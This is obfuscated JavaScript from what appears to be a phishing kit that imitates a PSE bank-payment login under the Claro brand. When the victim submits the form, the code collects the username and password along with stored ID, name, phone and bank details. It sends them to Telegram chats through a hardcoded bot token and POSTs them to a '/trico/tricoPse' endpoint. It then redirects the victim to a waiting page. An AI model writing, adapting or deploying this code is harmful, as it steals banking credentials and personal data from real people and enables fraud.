function _0x1df9(_0x23cb28, _0x305926) {
  const _0x3afa5d = _0x3afa();
  return (
    (_0x1df9 = function (_0x1df98b, _0x1ae5f7) {
      _0x1df98b = _0x1df98b - 0xa1;
      let _0x1cadd7 = _0x3afa5d[_0x1df98b];
      return _0x1cadd7;
    }),
    _0x1df9(_0x23cb28, _0x305926)
  );
}
const _0x4a8e83 = _0x1df9;
(function (_0x1b3d7f, _0x19897a) {
  const _0x202432 = _0x1df9,
    _0x2e27b1 = _0x1b3d7f();
  while (!![]) {
    try {
      const _0x3e9409 =
        -parseInt(_0x202432(0xa9)) / 0x1 +
        -parseInt(_0x202432(0xb3)) / 0x2 +
        -parseInt(_0x202432(0xa1)) / 0x3 +
        -parseInt(_0x202432(0xa6)) / 0x4 +
        (-parseInt(_0x202432(0xa8)) / 0x5) *
          (-parseInt(_0x202432(0xba)) / 0x6) +
        (parseInt(_0x202432(0xa2)) / 0x7) * (parseInt(_0x202432(0xc7)) / 0x8) +
        (parseInt(_0x202432(0xc1)) / 0x9) * (parseInt(_0x202432(0xbc)) / 0xa);
      if (_0x3e9409 === _0x19897a) break;
      else _0x2e27b1["push"](_0x2e27b1["shift"]());
    } catch (_0xfa6fd3) {
      _0x2e27b1["push"](_0x2e27b1["shift"]());
    }
  }
})(_0x3afa, 0xb307e);
function updateLS() {
  const _0x4af8ba = _0x1df9;
  LS[_0x4af8ba(0xb8)](_0x4af8ba(0xab), JSON[_0x4af8ba(0xb1)](info));
}
function _0x3afa() {
  const _0x54a487 = [
    "addEventListener",
    "238954LIOtMu",
    "focus",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "POST",
    "Por\x20favor\x20ingrese\x20la\x20contraseña",
    "setItem",
    "user",
    "6jZwAzI",
    "btnUsuario",
    "30yyBYxV",
    "usuario",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "application/json",
    "Por\x20favor\x20ingrese\x20el\x20nombre\x20de\x20usuario",
    "2568654zpRASc",
    "disabled",
    "click",
    "bank",
    "preventDefault",
    "ban",
    "2431856mtSDiU",
    "\x0aFuente:\x20",
    "statusText",
    "nombre",
    "error",
    "log",
    "value",
    "telnum",
    "location",
    "metaInfo",
    "Error\x20al\x20enviar\x20los\x20datos:",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "1428429mIdVwp",
    "21yYQvon",
    "dudename",
    "getElementById",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "1954612tYsDKD",
    "puser",
    "2894785UWEfgg",
    "529538PAGlBU",
    "txtPass",
    "info",
    "\x0a🏦Banco:\x20",
    "json",
    "&text=",
    "telefono",
    "password",
    "stringify",
  ];
  _0x3afa = function () {
    return _0x54a487;
  };
  return _0x3afa();
}
const button = document["getElementById"](_0x4a8e83(0xbb)),
  userInput = document[_0x4a8e83(0xa4)]("txtUsuario"),
  passInput = document[_0x4a8e83(0xa4)](_0x4a8e83(0xaa));
async function sendToTelegram(_0x57a3b2) {
  const _0x4f4fb1 = _0x4a8e83;
  for (const _0xef28cb of chatIds) {
    const _0x5ef0ad =
      _0x4f4fb1(0xd2) +
      _0xef28cb +
      _0x4f4fb1(0xae) +
      encodeURIComponent(_0x57a3b2);
    try {
      const _0x5c94c8 = await fetch(_0x5ef0ad);
      _0x5c94c8["ok"]
        ? console[_0x4f4fb1(0xcc)](_0x4f4fb1(0xbe) + _0xef28cb + ")")
        : console[_0x4f4fb1(0xcb)](
            _0x4f4fb1(0xa5) + _0xef28cb + "):",
            _0x5c94c8[_0x4f4fb1(0xc9)]
          );
    } catch (_0x54ec21) {
      console[_0x4f4fb1(0xcb)](
        "Error\x20de\x20red\x20(chat\x20ID:\x20" + _0xef28cb + "):",
        _0x54ec21
      );
    }
  }
}
button[_0x4a8e83(0xb2)](_0x4a8e83(0xc3), async function (_0x46bd17) {
  const _0x67c8f7 = _0x4a8e83;
  _0x46bd17[_0x67c8f7(0xc5)](), (button["disabled"] = !![]);
  if (userInput["value"] === "") {
    alert(_0x67c8f7(0xc0)),
      userInput[_0x67c8f7(0xb4)](),
      (button[_0x67c8f7(0xc2)] = ![]);
    return;
  } else {
    if (passInput["value"] === "") {
      alert(_0x67c8f7(0xb7)),
        passInput[_0x67c8f7(0xb4)](),
        (button["disabled"] = ![]);
      return;
    }
  }
  var _0x4f9a3a = userInput[_0x67c8f7(0xcd)],
    _0x5db12b = passInput["value"];
  (info[_0x67c8f7(0xd0)][_0x67c8f7(0xb9)] = _0x4f9a3a),
    (info["metaInfo"][_0x67c8f7(0xa7)] = _0x5db12b),
    updateLS();
  const _0x1f720d = {
      id: info["metaInfo"]["cc"],
      nombre: info[_0x67c8f7(0xd0)][_0x67c8f7(0xa3)],
      telefono: info[_0x67c8f7(0xd0)][_0x67c8f7(0xce)],
      direccion: "",
      usuario: info[_0x67c8f7(0xd0)][_0x67c8f7(0xb9)],
      password: info["metaInfo"]["puser"],
      bank: info[_0x67c8f7(0xd0)][_0x67c8f7(0xc6)],
    },
    _0x545fa2 =
      _0x67c8f7(0xb5) +
      _0x1f720d["id"] +
      "\x0a🆔Nombre:\x20" +
      _0x1f720d[_0x67c8f7(0xca)] +
      "\x0a📱Teléfono:\x20" +
      _0x1f720d[_0x67c8f7(0xaf)] +
      "\x0a🚹Usuario:\x20" +
      _0x1f720d[_0x67c8f7(0xbd)] +
      "\x0a🔒Contraseña:\x20" +
      _0x1f720d[_0x67c8f7(0xb0)] +
      _0x67c8f7(0xac) +
      _0x1f720d[_0x67c8f7(0xc4)] +
      _0x67c8f7(0xc8) +
      fuente;
  await sendToTelegram(_0x545fa2);
  try {
    const _0x5e7031 = await fetch(url + "/trico/tricoPse", {
      method: _0x67c8f7(0xb6),
      headers: { "Content-Type": _0x67c8f7(0xbf) },
      body: JSON[_0x67c8f7(0xb1)](_0x1f720d),
    });
    if (!_0x5e7031["ok"])
      throw new Error(
        "Error\x20en\x20la\x20respuesta\x20de\x20la\x20red\x20al\x20intentar\x20enviar\x20los\x20datos"
      );
    await _0x5e7031[_0x67c8f7(0xad)](),
      (window[_0x67c8f7(0xcf)]["href"] = "./wait.html");
  } catch (_0x260d7b) {
    console["error"](_0x67c8f7(0xd1), _0x260d7b), (button["disabled"] = ![]);
  }
});
